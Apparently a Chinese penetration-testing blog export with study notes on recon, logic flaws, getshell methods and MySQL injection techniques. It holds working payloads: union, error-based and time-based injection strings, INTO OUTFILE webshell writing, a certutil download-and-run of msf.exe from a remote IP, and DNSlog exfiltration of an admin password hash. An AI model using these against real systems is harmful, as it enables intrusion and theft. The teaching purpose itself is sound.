access数据库，数据库文件后缀为.mdb，一般配合的脚本语言为asp。为小型数据库。 SQL Server数据库，数据库文件后缀为.mdf，一般配合的脚本语言为asp。端口号为1433。 mysql数据库，数据库后缀文件为,sql，一般配合的脚本语言为php，端口号为3306。 Oracle数据库，端口号为1521。 sql注入判断数据库类型 特有的函数 通过使用查看数据库版本的函数，比如mysql的version()、@@version函数 substring和substr 1在mssql、mysql中可以调用substring。oracle则只可调用substr 其他的一些函数 123sql server: @@pack_received @@rowcountmysql:connection_id() last_insert_id() row_count()orcale:bitand(1,1) 对字符串的处理方式 12345sql server ：id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; --mssql:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39;mysql:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; ， &#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)oracle:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;a&#39;||&#39;b&#39; ，&#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)postgresql :id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;a&#39;||&#39;b&#39; ,&#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;) 特殊符号以及注释 123“&#x2F;*”是MySQL中的注释符，返回错误说明该注入点不是MySQL“--”是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。“;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库 根据返回的报错类型 12345678910ORACLEORA-01756:quoted string not properly terminatedORA-00933:SQLcommand not properly endedMS-SQLMsg 170,level 15, State 1,Line 1Line 1:Incorrect syntax near ‘fooMsg 105,level 15,state 1,Line 1Unclose quotation mark before the character string ‘fooMYSQLyou have an error in your SQL syntax,check the manual that corresponds to you mysql server version for the right stntax to use near ‘’foo’ at line x 各个数据库特有的表 1234567891011121、mssql数据库 http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sysobjects)&gt;0 and 1&#x3D;12、access数据库 http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from msysobjects)&gt;0 and 1&#x3D;13、mysql数据库(mysql版本在5.0以上) http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;14、oracle数据库 http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1 目录扫描 dirsearch、dirmap、dirb、御剑扫描工具。 端口扫描 namp、Masscan、msf 子域名信息收集 oneforall、知道创宇实验室ksubdomain 谷歌hacker语法 1site:baidu.com -www 网站CMS 判断网站CMS类型 cms特有的文件路径 比如WordPress的常用路径为wp-admin等等。 robots.txt文件中会列出一些禁止爬的目录。 查看版权信息 网页的最底部可能会有版权信息。 网页前台的源代码中可能会有注释的版权信息。 常见的cms扫描工具 WordPress的专用扫描工具，wpscan。 CMSmap可以扫描WordPress，Joomla和Drupal。 判断出CMS之后可以搜索以往的cms漏洞，或者找到源码审计一下。 操作系统的判断 nmap 参数-O表示扫描操作系统信息 ping命令 TTL起始值: Windows xp 128 (广域网中TTL为65-128) Linux/Unix64(广域网中TTL为1-64) 大小写 Linux系统对大小写敏感 window系统对大小写不敏感 漏洞挖掘owasp top 10漏洞挖掘 sql注入漏洞 逻辑漏洞 支付漏洞 任意金额修改 利用：抓包直接修改金额，可减少支付金额，也可修改为负的金额。 防御： 1、将商品ID和订单金额进行哈希加密，当用户修改金额之后再一次进行哈希加密并与原本的哈希值进行比较。 2、敏感参数不要放在url中。 请求重放 利用： 购买成功后，重放其中请求，竟然可以使购买商品一直增加。 cookie缺陷 token可以获取(前端爬虫) cookie重复利用 cookie可枚举 cookie使用简单的加密算法 验证码漏洞 验证码绕过 原因：直接让验证码参数值为空，或者直接删掉验证码参数名，可导致绕过。 验证码回显 原因：验证码由前端即客户端生成，可在请求包中直接获取验证码。比如，前端源码、cookie中存在验证码。 利用：利用脚本提取验证码，直接暴力破解。 防御： 1、后端生成验证码。 验证码重复利用与验证码暴力破解 绕过防暴力破解 限制IP X-Forwarded-For绕过 在请求包中增加XFF报头即可，然后使用burp并将其也设置为一个intruder payload即可。 服务端只对失败次数进行了校验，当登录成功之后失败次数清0. 注册一个用户，将注册的用户(知道密码，成功登录之后会清零登录限制次数)与要暴力破解的用户放在一起。比如：正常用户steady，其他测试用户boy、sadjh、sadkh。可以生成一下字典： 12345678910steady boy boy sadjh steady steady boy boy sadjh steady 越权漏洞 水平越权与垂直越权 密码找回漏洞 sql注入漏洞 某些字符标志可以组成url直接跳过验证 修改响应包 发送请求包，然后让响应包作为请求包，修改其中的敏感信息，然后再次发包。 跳过验证步骤(常见参数step) 修改某些参数，可跳过认证步骤。 替换用户账号或用户表示(uid、手机号、账号) 两个账户测试，先使用一个账户B找回，然后把账号修改为A，最终成功修改A的账号。也可以直接复制数据包，只修改某些用户表示。 删除某些参数可直接绕过验证 用户凭证在返回包中 用户发送请求包，可以直接看到token信息、验证码 常见GetShell方式owasp top 10漏洞拿shell sql注入拿shell sqlmap –os-shell sql注入漏洞直接写入shell 联合注入、报错注入、堆叠注入 日志文件拿shell(可以配合堆叠注入) sqlmap –sql-shell 能够执行sql语句之后，在写shell phpadmin拿shell 日志文件拿shell 直接执行sql语句那shell 命令执行拿shell 直接写shell到目标文件夹下面 执行系统命令、调用脚本语言反弹shell 文件上传拿shell 直接上传shell文件 上传一个具有写shell功能的文件，访问文件直接写入shell 上传一个具有命令执行的文件，然后执行命令写shell 文件包含漏洞拿shell 远程包含文件，将shell写入站点。 包含session文件 phpinfo本地包含临时文件 网站功能点上传shell 后台上传插件拿shell 后台数据库备份拿shell 数据库备份拿shell就是把我们sql语句放入数据库备份文件中,然后上传到服务器,服务器执行sql数据库备份文件进而执行我们的sql语句 1select &quot;一句话&quot; into outfile “路径” 这里的路径一定要是全路径,不能只是一个文件名,如果只写相对路径或者文件名,文件会存储到服务器中的mysql所在的文件夹中 后台编辑前台模版文件拿shell 其他漏洞挖掘方式 www.xxx.com\\www.xxx.com.zip|rar直接拖源码 常见端口利用11211端口–memcache漏洞介绍 Memcached 是一套常用的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公网开放的 Memcache 服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。 漏洞利用 telnet直接连接目标端口 1telnet xx.xx.xx.xx 11211 1234➜ ~ telnet ip 11211Trying ip...Connected to ip.Escape character is &#39;^]&#39;. nmap扫描 1234567891011121314151617181920212223nmap -sV -p 端口 --script memcached-info IPStarting Nmap 7.80 ( https://nmap.org ) at 2020-11-16 17:56 CSTNmap scan report for ipHost is up (0.54s latency).PORT STATE SERVICE VERSION11211/tcp open memcached Memcached 1.4.13 (uptime 27164261 seconds)| memcached-info:| Process ID: 1121| Uptime: 27164262 seconds| Server time: 2020-11-16T09:43:25| Architecture: 64 bit| Used CPU (user): 1792.059996| Used CPU (system): 2583.961487| Current connections: 7| Total connections: 8070135| Maximum connections: 1024| TCP Port: 11211| UDP Port: 0|_ Authentication: noService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.20 seconds 常用指令 1234stats &#x2F;&#x2F;查看memcache 服务状态 stats items &#x2F;&#x2F;查看所有items stats cachedump 32 0 &#x2F;&#x2F;获得缓存key get :state:264861539228401373:261588 &#x2F;&#x2F;通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露 权限提升站库分离从web入口通过web入口可以通过web漏洞getshell，getshell之后获取数据库配置文件、对数据库内容进行分析，主要找到数据库ip。 从数据库入口渗透获取数据库账号、密码 在mysql中可以查看用户正在运行的线程，进而得到数据库ip地址。 1select * from information_schema.processlist 在mssql中是否判断站酷分离 获取客户端主机名 1select host_name(); 获取服务端主机名 1select @@servername; 如果客户端主机名和服务端主机名一直则是同站同数据库，如果不是则是站库分离。 站库分离的判断方法查看网络连接状态通过Netstat命令查看MSSQL数据库1433端口的网络连接状态，可以看到与当前MSSQL数据库服务器192.168.32.8建立连接的只有192.168.32.3，由此可以判断这台主机为Web服务器，并且站库分离。 1netstat -ano | findstr &quot;1433&quot; 查看当前服务器的IP数据库配置文件 通过网站程序数据库配置文件来判断是否站库分离，如果数据库IP地址是localhost、127.0.0.1或当前主机内网IP则说明为同服务器，反之则可能为站库分离。 MySQL内置函数和库 1select @@hostname; &#x2F;&#x2F;服务端主机名称 1select * from information_schema.PROCESSLIST; &#x2F;&#x2F;客户端主机名称和端口 MSSQL注入语句 执行下面语句，如果页面正常回显，说明host_name()=@@servername即数据库服务端主机名称与数据库客户端主机名称一样，说明站库不分离。否则站库分离。 1and exists(select * from news where 1&#x3D;(SELECT (case when host_name()&#x3D;@@servername then 1 else 0 end))) MSSQL内置函数和表 123select host_name(); &#x2F;&#x2F;客户端主机名称select @@servername; &#x2F;&#x2F;服务端主机名称select serverproperty(&#39;MachineName&#39;); &#x2F;&#x2F;服务端主机名称 其他配置文件 通过load_file()这个内置函数读取一些敏感文件，hosts文件、IIS/Apache/Nginx/Tomcat/Jboss/Weblogic/Websphere的相关配置文件以及网卡信息等。 123456select load_file(&#39;C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts&#39;);&#x2F;etc&#x2F;hosts&#x2F;etc&#x2F;apache2&#x2F;apache2.conf&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules &#x2F;&#x2F;获取网卡名称&#x2F;etc&#x2F;network&#x2F;interfaces &#x2F;&#x2F;DHCP或静态IP 站库分离利用思路下载远程木马文件 目标主机允许通外网时我们可以利用Vbs/Ftp/IPC$/Certutil/Bitsadmin/Powershell等方式来下载远程文件到可读写目录中，然后再去执行一下即可。 12certutil -urlcache -split -f http:&#x2F;&#x2F;155.**.***.229:8888&#x2F;msf.exe C:\\ProgramData\\msf.exeC:\\ProgramData\\msf.exe 使用metasploit模块 在数据库服务器中，没有web服务我们无法上传webshell，比如上传php、jsp、aspx等文件到目标服务器，执行webshell进而拿到shell。这时候我们可以使用msf的模块，该模块监听一个端口，但是不是生成一个exe木马，或者是一个编程语言的webshell，而是利用对方主机能够执行命令的特点，来获取一个shell。 1Metasploit下的exploit&#x2F;multi&#x2F;script&#x2F;web_delivery和exploit&#x2F;windows&#x2F;misc&#x2F;hta_server两个模块来执行远程Payload获取会话 模拟令牌权限提升 通过Incognito扩展中的模拟令牌功能获取到数据库服务器的Admin/SYSTEM令牌。 通过Windows身份验证，使用数据库连接工具，比如sqlcmd、SSMS和Navicat Premium等。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"SQL--SQL注入漏洞","slug":"SQL注入漏洞","date":"2020-08-22T14:46:26.000Z","updated":"2020-11-10T07:51:52.387Z","comments":true,"path":"2020/08/22/SQL注入漏洞/","link":"","permalink":"http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"漏洞原理用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当前数据库用户、数据库中的表等信息，也可以读取敏感文件、写入服务器shell，进而获取主机权限。 基础知识MySQL 5.0以上版本。 数据库 information_schema 系统数据库，记录当前数据库的数据库，表，列，用户权限等信息。 表 SCHEMATA 储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等。 TABLES 提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。 COLUMNS 储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566mysql&gt; use information_schema;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+---------------------------------------+| Tables_in_information_schema |+---------------------------------------+| TABLES || SCHEMATA || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS |mysql&gt; desc TABLES;+-----------------+---------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-----------------+---------------------+------+-----+---------+-------+| TABLE_CATALOG | varchar(512) | NO | | | || TABLE_SCHEMA | varchar(64) | NO | | | || TABLE_NAME | varchar(64) | NO | | | || TABLE_TYPE | varchar(64) | NO | | | || ENGINE | varchar(64) | YES | | NULL | || VERSION | bigint(21) unsigned | YES | | NULL | || ROW_FORMAT | varchar(10) | YES | | NULL | || TABLE_ROWS | bigint(21) unsigned | YES | | NULL | || AVG_ROW_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || MAX_DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || INDEX_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_FREE | bigint(21) unsigned | YES | | NULL | || AUTO_INCREMENT | bigint(21) unsigned | YES | | NULL | || CREATE_TIME | datetime | YES | | NULL | || UPDATE_TIME | datetime | YES | | NULL | || CHECK_TIME | datetime | YES | | NULL | || TABLE_COLLATION | varchar(32) | YES | | NULL | || CHECKSUM | bigint(21) unsigned | YES | | NULL | || CREATE_OPTIONS | varchar(255) | YES | | NULL | || TABLE_COMMENT | varchar(2048) | NO | | | |+-----------------+---------------------+------+-----+---------+-------+mysql&gt; desc COLUMNS;+--------------------------+---------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+--------------------------+---------------------+------+-----+---------+-------+| TABLE_CATALOG | varchar(512) | NO | | | || TABLE_SCHEMA | varchar(64) | NO | | | || TABLE_NAME | varchar(64) | NO | | | || COLUMN_NAME | varchar(64) | NO | | | || ORDINAL_POSITION | bigint(21) unsigned | NO | | 0 | || COLUMN_DEFAULT | longtext | YES | | NULL | || IS_NULLABLE | varchar(3) | NO | | | || DATA_TYPE | varchar(64) | NO | | | || CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned | YES | | NULL | || CHARACTER_OCTET_LENGTH | bigint(21) unsigned | YES | | NULL | || NUMERIC_PRECISION | bigint(21) unsigned | YES | | NULL | || NUMERIC_SCALE | bigint(21) unsigned | YES | | NULL | || DATETIME_PRECISION | bigint(21) unsigned | YES | | NULL | || CHARACTER_SET_NAME | varchar(32) | YES | | NULL | || COLLATION_NAME | varchar(32) | YES | | NULL | || COLUMN_TYPE | longtext | NO | | NULL | || COLUMN_KEY | varchar(3) | NO | | | || EXTRA | varchar(30) | NO | | | || PRIVILEGES | varchar(80) | NO | | | || COLUMN_COMMENT | varchar(1024) | NO | | | || GENERATION_EXPRESSION | longtext | NO | | NULL | |+--------------------------+---------------------+------+-----+---------+-------+21 rows in set (0.00 sec) 总结 MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。 123456information_schema的表schemata中的列schema_name记录了所有数据库的名字information_schema的表tables中的列table_schema记录了所有数据库的名字information_schema的表tables中的列table_name记录了所有数据库的表的名字information_schema的表columns中的列table_schema记录了所有数据库的名字information_schema的表columns中的列table_name记录了所有数据库的表的名字information_schema的表columns中的列column_name记录了所有数据库的表的列的名字 常用函数right、left函数LEFT()函数是一个字符串函数,它返回具有指定长度的字符串的左边部分，我们在注入的时候，前台可能会限制回显字段，这时候我们可以使用这两个函数。 right同理 1234567891011121314151617181920212223mysql&gt; select right(&#x27;1234567890&#x27;,5);+-----------------------+| right(&#x27;1234567890&#x27;,5) |+-----------------------+| 67890 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select right(&#x27;1234567890&#x27;,2);+-----------------------+| right(&#x27;1234567890&#x27;,2) |+-----------------------+| 90 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select left(&#x27;1234567890&#x27;,5);+----------------------+| left(&#x27;1234567890&#x27;,5) |+----------------------+| 12345 |+----------------------+1 row in set (0.00 sec) isnull(exp)如果exp为null返回1，否侧返回0。 123456789101112131415mysql&gt; select isnull(1+1);+-------------+| isnull(1+1) |+-------------+| 0 |+-------------+1 row in set (0.00 sec)mysql&gt; select isnull(0);+-----------+| isnull(0) |+-----------+| 0 |+-----------+1 row in set (0.00 sec) 可以配合注入来判断文件是否存在以及是否有权限读取文件。 12mysql&gt; select * from math where id=1 and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#x27;/Users/apple/Desktop/2.txt&#x27;)),0x7e),0);ERROR 1105 (HY000): XPATH syntax error: &#x27;~1~&#x27; ifnull(expr1,expr2)假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串。 sleep()延时n秒，执行之后返回0。 1234567mysql&gt; select sleep(2);+----------+| sleep(2) |+----------+| 0 |+----------+1 row in set (2.00 sec) exists()exists子句返回的结果并不是从数据库中取出的结果集，而是一个布尔值，如果子句查询到数据，那么返回true，反之返回false。 1234567mysql&gt; select exists(select * from math);+----------------------------+| exists(select * from math) |+----------------------------+| 1 |+----------------------------+1 row in set (0.00 sec) 常用符号位运算符二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。 按位或 1234567mysql&gt; select 0|9879;+--------+| 0|9879 |+--------+| 9879 |+--------+1 row in set (0.00 sec) 按位异或 1234567mysql&gt; select 0^9879;+--------+| 0^9879 |+--------+| 9879 |+--------+1 row in set (0.00 sec) 按位与 1234567mysql&gt; select 0&amp;5464;+--------+| 0&amp;5464 |+--------+| 0 |+--------+1 row in set (0.00 sec) 0与任何的数字A按位或、异或都是A数字。 0与任何数字按位与都是0。 逻辑运算符 逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。 与运算符 123456789101112mysql&gt; select 2 and 0;+---------+| 2 and 0 |+---------+| 0 |+---------+ mysql&gt; select 2 and 1; +---------+ | 2 and 1 | +---------+ | 1 | +---------+ 或运算符 12345678910111213mysql&gt; select 2 or 0; +--------+ | 2 or 0 | +--------+ | 1 | +--------+ mysql&gt; select 2 or 1; +--------+ | 2 or 1 | +--------+ | 1 | +--------+ 非运算符 12345678910111213mysql&gt; select not 1; +-------+ | not 1 | +-------+ | 0 | +-------+ mysql&gt; select !0; +----+ | !0 | +----+ | 1 | +----+ 注入分类联合注入原理： 联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为union或union all。 条件： 页面有回显、有占位符 占位符： 从数据库中取出某些输入能够显示到页面上的某一个位置。 步骤： 判断是否有注入 判断是数字型注入还是字符型注入 猜测查询列数 列数小,正常回显,num大,不回显。 寻找占位 获取所有数据库名 获取指定数据的所有表名 获取指定数据库的指定数据表的所有字段名 获取指定数据库的指定数据表的所有的内容 常见payload判断字段 11&#x27; order by 2# 判断显示位 1-1&#x27; union select 1,2# 判断数据库banner信息 12-1&#x27; union select 1,2#-1&#x27; union select version(),database()# 判断数据库名字 11&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata–+ 判断数据库中的表名字 1-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+ 判断数据库中的表的列的名字 1-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+ 判断字段内容 1-1&#x27; union select user,password from users 报错注入 BIGINT等数据类型溢出 原理： 在mysql5.5之前，整形溢出是不会报错的，只有版本号大于5.5.5时，才会报错。 在mysql中要想获取BIGINT最大值，可以直接0按位置取反,超出最大值就会报错，而sql语句在执行成功的时候会返回0，取反之后就会变成1。 12345678910111213141516171819202122mysql&gt; select ~0;+----------------------+| ~0 |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec)mysql&gt; select (select * from (select user())x);+----------------------------------+| (select * from (select user())x) |+----------------------------------+| root@localhost |+----------------------------------+1 row in set (0.00 sec)mysql&gt; select !(select * from (select user())x);+-----------------------------------+| !(select * from (select user())x) |+-----------------------------------+| 1 |+-----------------------------------+1 row in set (0.00 sec) 超出最大值就会报错： 12mysql&gt; select ~0+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39; SQL注入利用 组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。 12mysql&gt; select ~0+!(select*from(select user())x);ERROR 1690 (22003): BIGINT value is out of range in &#39;(~(0) + (not((select &#39;root@localhost&#39; from dual))))&#39; 返回0 1select*from(select user())x 返回1 1!(select*from(select user())x); 溢出 1~0+!(select*from(select user())x); 同理 1!(select*from(select user())x)-~0 1mysql&gt; select username, password from users where id&#x3D;&#39;1&#39; or !(select*from(select user())x)-~0; 注意： 当MySQL版本大于或等于5.5.53时，数据溢出注入无效。 exp()函数：当传入的数值大于709的时候就会报错。 12345678910mysql&gt; select exp(709);+-----------------------+| exp(709) |+-----------------------+| 8.218407461554972e307 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select exp(710);ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39; exp函数与整形溢出结合 mysql&gt;5.5.53时，则不能返回查询结果 12345678910mysql&gt; select version();+-----------+| version() |+-----------+| 5.7.26 |+-----------+1 row in set (0.00 sec)mysql&gt; select exp(~(select * from (select user())x));ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;user()&#96; from (select user() AS &#96;user()&#96;) &#96;x&#96;)))&#39; mysql5.5.47可以在报错中返回查询结果 12mysql&gt; select (select(!x-~0)from(select(select user())x)a);ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39; xpath语法错误 原理： mysql&gt;5.1.5，提供两个函数来修改和查询XML，updatexml用来修改文档，extractvalue用来按照xpath语法查询节点内容。 updatexml()函数 1234UPDATEXML (XMLdocument, XPathstring, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)第三个参数：new_value，String格式，替换查找到的符合条件的数据 UPDATEXML第二个参数需要Xpath格式的字符串，如果不符合就会报错。 12mysql&gt; select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26~&#39; extractvalue()对XML文档进行查询的函数 123ExtractValue(xml_frag, xpath_expr)第一个参数：可以传入目标xml文档第二个参数：用Xpath路径法表示的查找路径 寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。 12mysql&gt; SELECT extractvalue(&#39;22&#39;,concat(&#39;~&#39;,(select version())));ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26&#39; 主键重复 基本函数 rand() rand()随机产生一个0～1的数字 123456789101112131415mysql&gt; select rand();+----------------------+| rand() |+----------------------+| 0.006128073675677249 |+----------------------+1 row in set (0.01 sec)mysql&gt; select rand();+---------------------+| rand() |+---------------------+| 0.33123136435750067 |+---------------------+1 row in set (0.00 sec) rand(0)产生一个固定的0～1的数字 123456789101112131415mysql&gt; select rand(0);+---------------------+| rand(0) |+---------------------+| 0.15522042769493574 |+---------------------+1 row in set (0.00 sec)mysql&gt; select rand(0);+---------------------+| rand(0) |+---------------------+| 0.15522042769493574 |+---------------------+1 row in set (0.00 sec) 有几条数据就会返回几条随机数 123456789101112131415161718192021222324252627mysql&gt; select rand() from math;+----------------------+| rand() |+----------------------+| 0.6377726314941167 || 0.1951690951317261 || 0.06252761190992558 || 0.7271308048880946 || 0.44807121944434125 || 0.058963713291067366 || 0.9506049388559581 |+----------------------+7 rows in set (0.00 sec)mysql&gt; select * from math;+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 25 | gongcheng || 3 | chengxian || 25 | gongcheng |+------+-----------+7 rows in set (0.00 sec) floor()该函数返回X的最大整数值，但不能大于X 1234567mysql&gt; select floor(5.23);+-------------+| floor(5.23) |+-------------+| 5 |+-------------+1 row in set (0.00 sec) floor() 返回小于等于该值的最大整数,rand返回0到1.乘2自然返回0到2,加上floor自然返回0到1.所以我们基本确认要么返回0要么返回1。 floor(rand(0)*2):具有确定性 floor(rand()*2):具有不确定性 原理： count()和group by在遇到rand()产生的重复值时报错。 Select name,count(*) from student group by name 这条语句的作用就是从student表中select出name和count(count会具体返回一个数字).这个数字的多少就是根据grop by 后面的name来决定。也就是说最终他会返回姓名以及每一个姓名出现的次数。 重点是这语句具体是怎么执行的？是如何计算出我们查询的不同字段(name)的个数的？ 发现mysql遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count(*) 在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加1，不存在则新建该分组 同理我们根据floor(rand(0)*2)进行分组—–这里要注意floor(rand(0)*2)执行之后是有规律的返回0或者1。 根据之前rand的顺序—011011011,我们来梳理一下为什么会报错 第一次计算执行一次产生0,表中不存在任何数据,然后开始插入 插入的时候会进行第二次计算,所以在执行一次产生1插入 第三次计算产生1因为第二次产生了1所以本次就无需在执行一次计算,直接在原来的基础上加1就可以,不会在进行一次计算 第四次产生0,原来的表中没有0所以要进行插入操作,会再一次计算产生1.所以会再次产生一个分组,注意是产生一个分组,不是单纯的产生一个数值 此时此刻就报错了。因为我们已经有了一个1分组了。注意是有了一个1分组了。在添加一个1分组会报错。 注意： sql语句在执行之后建立虚表分两种情况： 1、表中没有对应的列，执行一次查询，一次插入，floor(rand(0)*2)会被执行两次。 2、表中有对应的列，执行一次查询，一次插入，floor(rand(0)*2)只会被执行一次。 主键重复的最少前提就是虚拟表中要有三条数据才会产生重复,也就是group by执行至少三次,也就是对应的group by的表要有至少三条数据 几何函数 geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()等函数 这些函数报错原理大多都相同，都是不满足参数需求而导致的报错。 DNSlog外带配合报错注入 作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。用ceye.io这个平台，这个平台就集成了Dnslog的功能。 12http:&#x2F;&#x2F;127.0.0.1&#x2F;mysql.php?id&#x3D;1 union select 1,2,load_file(CONCAT(&#39;\\\\&#39;,(SELECT hex(pass) FROM test.test_user WHERE name&#x3D;&#39;admin&#39; LIMIT 1),&#39;.mysql.steady.ceye.io\\abc&#39;)) load_file函数在Linux下是无法用来做dnslog攻击的。 其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式 \\sss.xxx\\test\\ 这也就解释了为什么CONCAT()函数拼接了4个\\了，因为转义的原因，4个就变\\成了2个\\，目的就是利用UNC路径。 tips： 因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的 1UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。 常用payload12345id=-1&#x27; and extractvalue(1,concat(0x7e,user(),0x7e))#-1&#x27; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e))#-1&#x27; and updatexml(1,concat(0x7e,user(),0x7e),1)#-1&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)#-1&#x27; and (select 1 from(select count(),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)# Limit注入 常用函数 limit [位置偏移量,]行数 123456789101112131415161718mysql&gt; select * from math limit 1,2;+------+-----------+| id | name |+------+-----------+| 1 | 李明 || 1 | gongxinao |+------+-----------+2 rows in set (0.00 sec)mysql&gt; select * from math limit 1,3;+------+-----------+| id | name |+------+-----------+| 1 | 李明 || 1 | gongxinao || 1 | gongxinao |+------+-----------+3 rows in set (0.00 sec) benchmark benchmark函数有两个参数，第一个是执行次数，第二个是要测试的函数或者表达式 . limit注入 注入点 1select*from math limit 1,[可控点] 1select*from math order by id desc limit 1,2 limit后面能够拼接的函数只有into和procedure。 无order by关键字 使用union联合查询 1select id from math order by id desc limit 0,1 union select username from users; 报错注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 延时注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1) 只能使用BENCHMARK，而不能使用sleep 有order by关键字 无法使用union关键字，可尝试盲注或者报错 报错注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 延时注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1) 只能使用BENCHMARK，而不能使用sleep 堆叠注入定义 